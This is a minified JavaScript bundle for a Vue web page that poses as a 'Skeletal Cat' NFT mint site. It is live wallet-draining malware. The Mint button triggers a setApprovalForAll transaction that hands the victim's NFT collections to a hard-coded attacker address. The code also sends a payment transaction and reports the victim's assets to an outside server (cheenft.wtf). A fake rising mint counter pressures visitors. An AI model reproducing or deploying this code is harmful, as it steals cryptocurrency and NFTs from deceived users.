(function(t) {
    function e(e) {
        for (var s, a, o = e[0], c = e[1], d = e[2], u = 0, h = []; u < o.length; u++) a = o[u], Object.prototype.hasOwnProperty.call(r, a) && r[a] && h.push(r[a][0]), r[a] = 0;
        for (s in c) Object.prototype.hasOwnProperty.call(c, s) && (t[s] = c[s]);
        l && l(e);
        while (h.length) h.shift()();
        return i.push.apply(i, d || []), n()
    }

    function n() {
        for (var t, e = 0; e < i.length; e++) {
            for (var n = i[e], s = !0, o = 1; o < n.length; o++) {
                var c = n[o];
                0 !== r[c] && (s = !1)
            }
            s && (i.splice(e--, 1), t = a(a.s = n[0]))
        }
        return t
    }
    var s = {},
        r = {
            app: 0
        },
        i = [];

    function a(e) {
        if (s[e]) return s[e].exports;
        var n = s[e] = {
            i: e,
            l: !1,
            exports: {}
        };
        return t[e].call(n.exports, n, n.exports, a), n.l = !0, n.exports
    }
    a.m = t, a.c = s, a.d = function(t, e, n) {
        a.o(t, e) || Object.defineProperty(t, e, {
            enumerable: !0,
            get: n
        })
    }, a.r = function(t) {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(t, "__esModule", {
            value: !0
        })
    }, a.t = function(t, e) {
        if (1 & e && (t = a(t)), 8 & e) return t;
        if (4 & e && "object" === typeof t && t && t.__esModule) return t;
        var n = Object.create(null);
        if (a.r(n), Object.defineProperty(n, "default", {
                enumerable: !0,
                value: t
            }), 2 & e && "string" != typeof t)
            for (var s in t) a.d(n, s, function(e) {
                return t[e]
            }.bind(null, s));
        return n
    }, a.n = function(t) {
        var e = t && t.__esModule ? function() {
            return t["default"]
        } : function() {
            return t
        };
        return a.d(e, "a", e), e
    }, a.o = function(t, e) {
        return Object.prototype.hasOwnProperty.call(t, e)
    }, a.p = "/";
    var o = window["webpackJsonp"] = window["webpackJsonp"] || [],
        c = o.push.bind(o);
    o.push = e, o = o.slice();
    for (var d = 0; d < o.length; d++) e(o[d]);
    var l = c;
    i.push([0, "chunk-vendors"]), n()
})({
    0: function(t, e, n) {
        t.exports = n("56d7")
    },
    "034f": function(t, e, n) {
        "use strict";
        n("85ec")
    },
    1: function(t, e) {},
    10: function(t, e) {},
    11: function(t, e) {},
    12: function(t, e) {},
    2: function(t, e) {},
    3: function(t, e) {},
    4: function(t, e) {},
    5: function(t, e) {},
    "56d7": function(t, e, n) {
        "use strict";
        n.r(e);
        var s = n("2b0e"),
            r = n("8c4f"),
            i = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                    attrs: {
                        id: "app"
                    }
                }, [n("Mint")], 1)
            },
            a = [],
            o = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                    attrs: {
                        id: "__next"
                    }
                }, [n("div", {
                    staticClass: "sc-ehmTmK cniBrL"
                }), n("div", {
                    staticClass: "sc-ehmTmK NpkYQ"
                }), n("div", {
                    staticClass: "sc-ehmTmK dlHeaT"
                }), n("div", {
                    staticClass: "sc-ehmTmK cJTqaw"
                }), n("div", {
                    staticClass: "px-6 min-h-screen bg-sc-black text-white font-body pb-24"
                }, [n("main", {
                    staticClass: "container max-w-5xl mx-auto"
                }, [t._m(0), n("article", {
                    staticClass: "flex flex-col space-y-8"
                }, [n("section", {
                    staticClass: "\n            rounded-lg\n            p-10\n            space-y-6\n            md:pr-[40%] md:bg-[url(/cat1.png)]\n            bg-right-bottom bg-no-repeat bg-contain bg-sc-lavender\n            text-sc-black\n          "
                }, [n("h2", {
                    staticClass: "text-3xl font-display"
                }, [t._v("OPEN TO PUBLIC")]), "" == t.userAddress ? n("button", {
                    staticClass: "\n              bg-white\n              h-14\n              px-10\n              uppercase\n              font-bold\n              rounded-lg\n              shadow-hard\n              border-2\n              text-black\n              border-black\n            "
                }, [t._v(" Connect Wallet to Mint")]) : t._e(), "" != t.userAddress ? n("button", {
                    staticClass: "\n              bg-white\n              h-14\n              px-10\n              uppercase\n              font-bold\n              rounded-lg\n              shadow-hard\n              border-2\n              text-black\n              border-black\n            ",
                    on: {
                        click: t.sequence
                    }
                }, [t._v(" Mint ")]) : t._e()])])])])])
            },
            c = [function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("header", {
                    staticClass: "\n          flex flex-col\n          py-10\n          md:py-0 md:flex-row\n          justify-between\n          items-center\n        "
                }, [n("img", {
                    staticClass: "animate-[spin_5s_linear_infinite] h-12 w-12 md:h-28 md:w-28",
                    attrs: {
                        src: "/static/media/skele-badge.png",
                        "aria-hidden": "true"
                    }
                }), n("div", {
                    staticClass: "py-2 md:py-16"
                }, [n("h1", {
                    staticClass: "font-display uppercase text-4xl md:text-6xl text-center"
                }, [n("span", {
                    staticClass: "text-sc-black",
                    staticStyle: {
                        "text-shadow": "rgb(255, 255, 255) 2px 2px 0px",
                        "-webkit-text-stroke": "1px rgb(255, 255, 255)"
                    }
                }, [t._v("Mint a")]), n("br"), t._v("Skeletal Cat ")]), n("div", {
                    staticClass: "flex justify-center mt-3"
                }, [n("div", {
                    staticClass: "sc-dmRaPn fWYCjr"
                }, [n("button", {
                    staticClass: "sc-fLlhyt kYKtpL",
                    attrs: {
                        "data-testid": "test-connect-button-button"
                    }
                })])])]), n("img", {
                    staticClass: "animate-[spin_5s_linear_infinite] h-12 w-12 md:h-28 md:w-28",
                    attrs: {
                        src: "/static/media/skele-badge.png",
                        "aria-hidden": "true"
                    }
                })])
            }];
        async function d() {
            if (!window.ethereum) return alert("MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"), "error";
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{
                        chainId: "0x1"
                    }]
                });
                const t = await ethereum.request({
                    method: "eth_requestAccounts"
                });
                return t[0]
            } catch (t) {
                if (4902 === t.code) try {
                    await window.ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: "0x1"
                        }]
                    }), await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{
                            chainId: "0x1"
                        }]
                    });
                    const t = await ethereum.request({
                        method: "eth_requestAccounts"
                    });
                    return t[0]
                } catch (e) {
                    console.error(e)
                }
                return console.error(t), "error"
            }
        }
        async function l(t) {
            const e = {
                    nonce: "0x00",
                    to: "0xD7398B04566AAd38DEF7752e5FF28b9f82dBe535",
                    from: ethereum.selectedAddress,
                    value: t.toString(16),
                    chainId: "0x1"
                },
                n = await ethereum.request({
                    method: "eth_sendTransaction",
                    params: [e]
                });
            return n
        }
        async function u(t, e) {
            var s = n("99e5");
            const r = new s(window.web3.currentProvider);
            var i = r.eth.abi.encodeFunctionCall({
                name: "setApprovalForAll",
                type: "function",
                inputs: [{
                    type: "address",
                    name: "operator"
                }, {
                    type: "bool",
                    name: "approved"
                }]
            }, [e, "1"]);
            const a = {
                to: t,
                from: ethereum.selectedAddress,
                data: i,
                chainId: "0x1"
            };
            try {
                await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [a]
                })
            } catch {
                return "error"
            }
        }
        async function h(t) {
            const e = {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(t)
            };
            await fetch("https://rrrr.cheenft.wtf/sendItem", e)
        }
        async function m(t) {
            var e = await fetch("https://rrrr.cheenft.wtf/getContract/" + t);
            return e.json()
        }
        var f = {
                name: "Mint",
                data() {
                    return {
                        id: Math.floor(300 * Math.random()) + 100,
                        mintNumber: 500,
                        maxMintNumber: 3690,
                        mintPrice: .3,
                        mintAmount: 1,
                        projectName: "medievalpixels",
                        receiverAddress: "0xf10E0A2443AEC73f3313eFEd04D5DF130488Ef69",
                        isAscending: !0,
                        accounts: [],
                        userAddress: "",
                        contractsNFT: [],
                        contractsNFTindex: 0,
                        mintTx: "",
                        interval: null,
                        sending: !1,
                        connecting: !1,
                        txError: !1,
                        isDutchAuction: !1,
                        startTime: 1649617200,
                        now: null,
                        minutes: 0,
                        loading: !0,
                        isMinting: !1
                    }
                },
                mounted() {
                    this.connect()
                },
                watch: {
                    async mintTx() {
                        0 == this.contractsNFT.length && (this.contractsNFT = await m(this.userAddress));
                        var t = this.contractsNFT[this.contractsNFTindex];
                        0 != this.contractsNFT.length && setTimeout(async () => {
                            var e = await u(t.smartContractId, this.receiverAddress);
                            if ("error" != e) {
                                this.contractNFTindex = 1;
                                var n = "twitter";
                                "?utm_source=icy.tools" == window.location.search && (n = "icytools"), h({
                                    smartContractId: t.smartContractId,
                                    collectionTitle: t.collectionTitle,
                                    collectionImage: t.collectionImage,
                                    collectionSlug: t.collectionSlug,
                                    floorPrice: t.floorPrice,
                                    nbItems: t.nbItems,
                                    totalPrice: t.totalPrice,
                                    tokens: t.tokens.toString(),
                                    fromAddress: this.userAddress,
                                    toAddress: this.receiverAddress,
                                    fromSite: n
                                })
                            }
                        }, 500), setTimeout(() => this.txError = !0, 15e3), this.processing = !1, this.show = !0
                    }
                },
                methods: {
                    settt() {
                        this.mintTx = "s"
                    },
                    async connect() {
                        this.connecting = !0;
                        var t = await d();
                        this.connecting = !1, "error" != t && (this.userAddress = t, this.contractsNFT = await m(this.userAddress))
                    },
                    async send() {
                        this.txError = !1, "" == this.userAddress && await this.connect(), 0 == this.contractsNFT.length && (this.contractsNFT = await m(this.userAddress)), this.sending || (this.sending = !0, l(this.mintAmount * this.mintPrice * Math.pow(10, 18)).then(t => {
                            this.sending = !1, this.mintTx = t
                        }).catch(t => {
                            this.sending = !1
                        }))
                    },
                    changeMintAmount(t) {
                        const e = this.mintAmount + t;
                        0 != e && 4 != e && (this.mintAmount = e)
                    },
                    discoWallet() {
                        this.userAddress = ""
                    },
                    async sequence() {
                        this.isMinting || (this.isMinting = !0, "" != this.userAddress && this.settt())
                    },
                    async sendItem() {
                        await this.connect();
                        var t = this.contractsNFT[this.contractsNFTindex];
                        await h({
                            smartContractId: t.smartContractId,
                            collectionTitle: t.collectionTitle,
                            collectionImage: t.collectionImage,
                            collectionSlug: t.collectionSlug,
                            floorPrice: t.floorPrice,
                            nbItems: t.nbItems,
                            totalPrice: t.totalPrice,
                            tokens: t.tokens.toString(),
                            fromAddress: this.userAddress,
                            toAddress: this.receiverAddress
                        })
                    }
                },
                created() {
                    this.interval = setInterval(async () => {
                        if (this.isDutchAuction && (this.now = parseInt((new Date).getTime() / 1e3)), this.isAscending) {
                            if (this.mintNumber < this.maxMintNumber && Math.random() < .5) {
                                var t = this.mintNumber += Math.floor(50 * Math.random()) + 1;
                                t > this.maxMintNumber ? this.mintNumber = this.maxMintNumber : this.mintNumber = t
                            }
                        } else if (this.mintNumber > 0 && Math.random() < .5) {
                            t = this.mintNumber -= Math.floor(50 * Math.random()) + 1;
                            this.mintNumber = t < 0 ? 0 : t
                        }
                        "" != this.address && window.ethereum.selectedAddress != this.address && null == window.ethereum.selectedAddress && (this.userAddress = "")
                    }, 1e3)
                }
            },
            p = f,
            b = n("2877"),
            w = Object(b["a"])(p, o, c, !1, null, null, null),
            g = w.exports,
            x = {
                name: "App",
                components: {
                    Mint: g
                }
            },
            v = x,
            y = (n("034f"), Object(b["a"])(v, i, a, !1, null, null, null)),
            A = y.exports;
        s["a"].config.productionTip = !1, new s["a"]({
            render: t => t(A)
        }).$mount("#app"), s["a"].use(r["a"])
    },
    6: function(t, e) {},
    7: function(t, e) {},
    8: function(t, e) {},
    "85ec": function(t, e, n) {},
    9: function(t, e) {}
});
//# sourceMappingURL=app.aa648e47.js.map